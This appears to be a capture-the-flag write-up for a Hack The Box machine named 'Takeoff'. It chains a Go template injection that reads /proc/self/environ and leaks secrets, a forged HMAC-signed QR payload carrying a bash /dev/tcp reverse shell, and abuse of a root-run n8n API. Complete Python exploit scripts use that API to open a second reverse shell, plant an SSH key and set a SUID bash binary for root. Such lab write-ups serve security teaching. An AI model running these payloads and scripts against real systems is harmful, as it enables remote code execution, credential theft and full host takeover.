# Takeoff 

<img width="1602" height="286" alt="image" src="https://github.com/user-attachments/assets/0061e55f-ab7e-4e2a-8502-17e92b2336c5" />



---

## port scanning 


```ruby
─$ nmap -sCV -Pn 10.129.86.21    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-31 21:45 UTC
Nmap scan report for 10.129.86.21
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
                                                                                                                                                                                              
┌──(kali㉿kali)-[~]

```

---


## enumrate the website


<img width="1919" height="802" alt="image" src="https://github.com/user-attachments/assets/0c4df813-28c2-4f3b-904d-7a5dd2cde477" />

```
feroxbuster -u http://10.129.86.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

<img width="1744" height="629" alt="image" src="https://github.com/user-attachments/assets/413e4741-9fbc-4c6a-be16-88c531a2b070" />



## i created account and logged in 

<img width="1919" height="758" alt="image" src="https://github.com/user-attachments/assets/86e5c813-4ca7-4374-8967-179fa5aebcfa" />


## i booked tickets and i found that i can add note to tickets 


<img width="1916" height="707" alt="image" src="https://github.com/user-attachments/assets/d96de14e-5314-4b18-9127-6c5b53363bf3" />

> ### notice in response that our app work with **`echo`** go Framework

<img width="1431" height="364" alt="image" src="https://github.com/user-attachments/assets/2b284142-606b-41e7-80d3-8e95ff195f04" />




## i found xss reflect in **`/trips`**

<img width="1902" height="703" alt="image" src="https://github.com/user-attachments/assets/2986c632-720a-439c-918e-46fd6d5e9779" />

## but i think that maybe not useful so i will try other injections maybe will work  

<img width="1753" height="532" alt="image" src="https://github.com/user-attachments/assets/8332ad06-c024-4a8a-9fcf-cbd86834e691" />

##  let's try **`{{ .File "/etc/passwd" }}`**


```
{{ .File "/etc/passwd" }}
```

**` and bingo`**

<img width="1751" height="616" alt="image" src="https://github.com/user-attachments/assets/11c578c4-2fb2-41ad-a2d3-a42b04302ed8" />

---

## so now we can do LFI via ssti let's enumrate our system

```
{{ .File "/proc/self/environ" }}
```

<img width="1503" height="420" alt="image" src="https://github.com/user-attachments/assets/91821833-5ba2-4e21-8c25-e060fddffced" />

```
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
USER=www-data
LOGNAME=www-data
HOME=/var/www
INVOCATION_ID=5dc0c899891a4c13bd643681f2586e50
JOURNAL_STREAM=9:14433
SYSTEMD_EXEC_PID=1753
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/htb-air.service/memory.pressure
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo

```


> ### The application generated a boarding pass QR code containing a JSON object with a `NotifyCmd` field. The integrity of this JSON was protected by an HMAC-SHA256 signature appended to the end of the data. By exploiting the Server-Side Template Injection (SSTI) to read `/proc/self/environ`, I extracted the `TICKET_VALIDATION_TOKEN`. This allowed me to forge a new QR code with a malicious `NotifyCmd` payload and a valid signature. Upon submitting this to the check-in API, the server executed the command, yielding a `www-data` shell.



<img width="1074" height="210" alt="image" src="https://github.com/user-attachments/assets/1173e72f-9f59-4d1f-bcf4-870f00f3df7a" />


---

## Extract the QR image from the PDF

```
pdfimages -all your_ticket.pdf qr_image
```

<img width="771" height="142" alt="image" src="https://github.com/user-attachments/assets/77f38534-7c19-4e8e-a683-c934579e5201" />

## Decode the QR code

```
zbarimg qr_image-000.png
```

<img width="1720" height="169" alt="image" src="https://github.com/user-attachments/assets/99c94cfd-6c19-48f4-a800-b003962a6d37" />
<img width="1732" height="165" alt="image" src="https://github.com/user-attachments/assets/cacba58b-76a3-4976-858e-1707a757578e" />


---

## save base64 as file 

```
echo 'ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5fwMBARhWZXJpZnlUaWNrZXRBdXRoZW50aWNpdHkB/4AAAQEBBERhdGEBCgAAAP+o/4D/pAH/oHsiUE5SIjoiTFQ0SlRUIiwiVG9rZW4iOiJiZTI1ODkyOGUzM2NhODk1OGQ1YjJkMWM2ODJlMmQ1ZSIsIlNlYXQiOiIyQiIsIlBhc3NlbmdlciI6ImFkbWluIiwiTm90aWZ5Q21kIjoiY2hlY2staW4tbm90aWZ5IC0tcG5yIExUNEpUVCAtLWVtYWlsIGFkbWluQGV4YW1wbGUuY29tIn0AB6E/lTJFMdwEkvrNjAJZcBMnfaxgs7PROxeCiHGnfSc=' > original_qr.txt
```

## Forge the QR Code and Trigger RCE


```python

import base64
import hmac
import hashlib
import re
import requests

# --- CONFIGURATION ---
SECRET_KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"
LHOST = "10.10.16.252" 
LPORT = "4444"
YOUR_JWT = "YOUR_SESSION_TOKEN_COOKIE_HERE" # Paste your JWT here!

# 1. Read the original Base64 QR string
with open("original_qr.txt", "r") as f:
    qr_b64 = f.read().strip()

raw = base64.b64decode(qr_b64)

# 2. Find the JSON string inside the binary data
json_match = re.search(rb'\{"PNR".*?\}', raw)
if not json_match:
    print("[-] Could not find JSON in QR data.")
    exit(1)

original_json = json_match.group(0)

# 3. Create the reverse shell command
# We need to make sure the new JSON is EXACTLY the same length as the old one
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

# Parse the original JSON to update the NotifyCmd
import json
parsed = json.loads(original_json)
parsed["NotifyCmd"] = cmd

# Dump back to JSON, removing spaces to ensure compact format
new_json = json.dumps(parsed, separators=(',', ':')).encode()

# Pad with spaces if the new command is shorter than the original
if len(new_json) < len(original_json):
    new_json = new_json.replace(b'"}', b' ' * (len(original_json) - len(new_json)) + b'"}')
elif len(new_json) > len(original_json):
    print("[-] Command too long! Shorten your LHOST/LPORT or command.")
    exit(1)

# 4. Replace the JSON bytes in the raw binary data
body = bytearray(raw)
start, end = json_match.span()
body[start:end] = new_json

# 5. Recalculate the HMAC-SHA256 signature
# The signature is the last 32 bytes of the raw data
data_to_sign = bytes(body[:-32])
signature = hmac.new(SECRET_KEY, data_to_sign, hashlib.sha256).digest()
body[-32:] = signature

# 6. Base64 encode the final forged payload
final_b64 = base64.b64encode(bytes(body)).decode()

# 7. Send to the API
print("[*] Sending forged QR to /api/check-in...")
headers = {"Cookie": f"session_token={YOUR_JWT}"}
data = {"qr_data": final_b64, "gate": "WEB"}

try:
    r = requests.post("http://takeoff.htb/api/check-in", headers=headers, data=data)
    print(f"[*] Response: {r.status_code} - {r.text}")
except Exception as e:
    print(f"[-] Error: {e}")

print("[*] Check your Netcat listener!")
```


## run exploit 

```
python3 exploit.py
```

<img width="696" height="87" alt="image" src="https://github.com/user-attachments/assets/1abf296b-55a7-4af8-b253-e5d476f3ae1a" />

<img width="973" height="166" alt="image" src="https://github.com/user-attachments/assets/8022481d-2138-4d70-b95b-85f62a79a08d" />


## we found **`N8N_API_KEY`** before so let's Find the n8n process

```
ps aux | grep n8n
```

<img width="1743" height="162" alt="image" src="https://github.com/user-attachments/assets/99fba16c-94da-48f8-8b82-fdb585449460" />


1. **The user is `root`**: The n8n process is running as the root user.
    
2. **The command is `node /usr/local/bin/n8n`**: n8n is a Node.js application.
    
3. **The task runner** (`node --disallow-code-generation... @n8n/task-runner`) is also running as root, which means it's ready to execute workflow nodes (like the Execute Command node) with root privileges.


---

> I inspected the systemd service file for the application using `systemctl cat htb-air`. The file showed that the main web application ran as the unprivileged `www-data` user. However, it also revealed the `N8N_API_KEY` environment variable and a dependency on `docker.service`. This indicated that the n8n instance was running separately from the web app.

> I was checked running processes with `ps aux | grep n8n` and confirmed that the n8n process was running as `root`. Because the n8n application runs as root and allows the execution of arbitrary commands via workflows, the leaked API key could be used to escalate privileges from `www-data` to root.

```
systemctl cat htb-air
```

<img width="1385" height="485" alt="image" src="https://github.com/user-attachments/assets/7a1ff0c7-2ca2-4501-b9fb-8584f7948a02" />


---


## test n8n api


```python

curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
  -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
  -H "Content-Type: application/json" \
  -d '{"name":"raw_json_probe","nodes":[],"connections":{},"settings":{}}'

```

<img width="1781" height="163" alt="image" src="https://github.com/user-attachments/assets/c8e6d78a-f5a1-4ec6-a927-9fcf23138c5c" />


```
"project": {
    "name": "Keith Park <kpark@takeoff.htb>",
    "id": "8uop0aEowj4YUSmN",
    "type": "personal",
    "creatorId": "075876fe-9d5c-4ec3-9ffe-e1159bb790ea"
}
```


> To confirm the identity of the n8n instance owner, I submitted a `POST` request to the `/api/v1/workflows` endpoint with a minimal dummy JSON payload. The API responded with `HTTP 201 Created` and returned the full object of the newly created workflow. Within the `"shared"` metadata, the API leaked the `"project"` object, revealing the owner's name (`Keith Park <kpark@takeoff.htb>`) and creator ID. This confirmed the host user `kpark` was tied to the n8n container.



----

## exploit n8n

```python
import requests
import json

API_KEY = "<FOUND_N8N_API_KEY>"
TARGET = "http://127.0.0.1:5678/api/v1"

HEADERS = {
    "X-N8N-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

LHOST = "10.10.14.25"
LPORT = "9002"

wf = {
    "name": "root_pwn",
    "nodes": [
        {
            "parameters": {
                "httpMethod": "GET",
                "path": "pwn",
                "responseMode": "responseNode"
            },
            "id": "webhook-1",
            "name": "Webhook",
            "type": "n8n-nodes-base.webhook",
            "typeVersion": 2,
            "position": [240, 300],
            "webhookId": "pwn-uuid-001"
        },
        {
            "parameters": {
                "command": f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
            },
            "id": "exec-1",
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [460, 300]
        },
        {
            "parameters": {},
            "id": "respond-1",
            "name": "Respond to Webhook",
            "type": "n8n-nodes-base.respondToWebhook",
            "typeVersion": 1,
            "position": [680, 300]
        }
    ],
    "connections": {
        "Webhook": {
            "main": [[
                {
                    "node": "Execute Command",
                    "type": "main",
                    "index": 0
                }
            ]]
        },
        "Execute Command": {
            "main": [[
                {
                    "node": "Respond to Webhook",
                    "type": "main",
                    "index": 0
                }
            ]]
        }
    },
    "settings": {
        "executionOrder": "v1"
    }
}

r = requests.post(
    f"{TARGET}/workflows",
    json=wf,
    headers=HEADERS
)

wf_id = r.json()["id"]

requests.post(
    f"{TARGET}/workflows/{wf_id}/activate",
    headers=HEADERS
)

requests.get("http://127.0.0.1:5678/webhook/pwn")
```


## root Breakout

> ###  filesystem mount between the n8n container and the host.

> ### **According to the observed configuration, the container's /root directory is mounted to /home/kpark on the host. This means that files created under the relevant container path are also accessible through the corresponding host path.**

----




## Generate the SSH Key Pair

```
ssh-keygen -t ed25519 -f kpark_key -N ""
```

## Create the n8n API Script that writes our key to the mounted directory.

```python
import requests

API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
TARGET = "http://127.0.0.1:5678/api/v1"
PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJnfNguQrrWOKb0jaqJutZ3RMNtXRDIce6bvthLAHfoF kali@kali"

HEADERS = {
    "X-N8N-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

# The command writes the key to /root/.ssh/ and fixes permissions
command = f"mkdir -p /root/.ssh && echo '{PUBKEY}' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && chown -R 1001:1001 /root/.ssh"

wf = {
    "name": "ssh_inject",
    "nodes": [
        {
            "parameters": {"httpMethod": "GET", "path": "sshinject", "responseMode": "responseNode"},
            "id": "webhook-1", "name": "Webhook", "type": "n8n-nodes-base.webhook",
            "typeVersion": 2, "position": [240, 300], "webhookId": "ssh-uuid-001"
        },
        {
            "parameters": {"command": command},
            "id": "exec-1", "name": "Execute Command", "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1, "position": [460, 300]
        },
        {
            "parameters": {}, "id": "respond-1", "name": "Respond to Webhook",
            "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": [680, 300]
        }
    ],
    "connections": {
        "Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]},
        "Execute Command": {"main": [[{"node": "Respond to Webhook", "type": "main", "index": 0}]]}
    },
    "settings": {"executionOrder": "v1"}
}

print("[*] Creating workflow...")
r = requests.post(f"{TARGET}/workflows", json=wf, headers=HEADERS)
wf_id = r.json()["id"]

print(f"[*] Activating workflow {wf_id}...")
requests.post(f"{TARGET}/workflows/{wf_id}/activate", headers=HEADERS)

print("[*] Triggering webhook...")
try:
    requests.get("http://127.0.0.1:5678/webhook/sshinject", timeout=3)
except Exception:
    pass

print("[*] Done. Try SSHing in as kpark.")
```



```
python3 ssh_exploit.py
```


---

## SSH as kpark

```
ssh -i kpark_key kpark@takeoff.htb
```

<img width="1452" height="378" alt="image" src="https://github.com/user-attachments/assets/8a51fb52-f910-49e5-a4b9-b400f4a5e5af" />


----


## Privilege Escalation

> ### The approach described in the original notes is to create a Bash copy in /home/kpark and then use the container-side workflow to change its ownership and set its SUID permission bit.


##  Create a Bash Copy

```
cp /bin/bash /home/kpark/hb
```

---

##  Set Ownership and SUID Permissions 



```python
import requests

API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo"
TARGET = "http://127.0.0.1:5678/api/v1"

HEADERS = {
    "X-N8N-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

# The command to set root ownership and SUID bit
command = "chown root:root /root/hb && chmod 4755 /root/hb"

wf = {
    "name": "suid_pwn",
    "nodes": [
        {
            "parameters": {"httpMethod": "GET", "path": "suidpwn", "responseMode": "responseNode"},
            "id": "webhook-1", "name": "Webhook", "type": "n8n-nodes-base.webhook",
            "typeVersion": 2, "position": [240, 300], "webhookId": "suid-uuid-001"
        },
        {
            "parameters": {"command": command},
            "id": "exec-1", "name": "Execute Command", "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1, "position": [460, 300]
        },
        {
            "parameters": {}, "id": "respond-1", "name": "Respond to Webhook",
            "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": [680, 300]
        }
    ],
    "connections": {
        "Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]},
        "Execute Command": {"main": [[{"node": "Respond to Webhook", "type": "main", "index": 0}]]}
    },
    "settings": {"executionOrder": "v1"}
}

print("[*] Creating workflow...")
r = requests.post(f"{TARGET}/workflows", json=wf, headers=HEADERS)
wf_id = r.json()["id"]

print(f"[*] Activating workflow {wf_id}...")
requests.post(f"{TARGET}/workflows/{wf_id}/activate", headers=HEADERS)

print("[*] Triggering webhook...")
try:
    requests.get("http://127.0.0.1:5678/webhook/suidpwn", timeout=3)
except Exception:
    pass

print("[*] Done. Check /home/kpark/hb on the host.")

```

---

## Obtain a Root Shell


```
/home/kpark/hb -p
```


<img width="949" height="73" alt="image" src="https://github.com/user-attachments/assets/6e6bc4df-50ec-4c00-bb80-d538a7206438" />





